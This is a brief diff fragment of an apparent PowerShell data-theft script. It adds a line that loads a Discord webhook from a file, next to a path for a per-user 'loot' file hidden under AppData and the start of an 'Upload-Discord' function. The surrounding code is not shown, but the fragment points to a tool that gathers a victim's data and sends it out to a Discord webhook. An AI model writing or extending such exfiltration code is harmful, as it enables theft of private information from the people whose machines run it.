@@ -4,6 +4,8 @@
 
 $Path="$env:appdata\-locker\$env:UserName-loot.txt"
 
+$dc = [IO.File]::ReadAllText(".\wh.txt")
+
 function Upload-Discord {
 
 [CmdletBinding()]
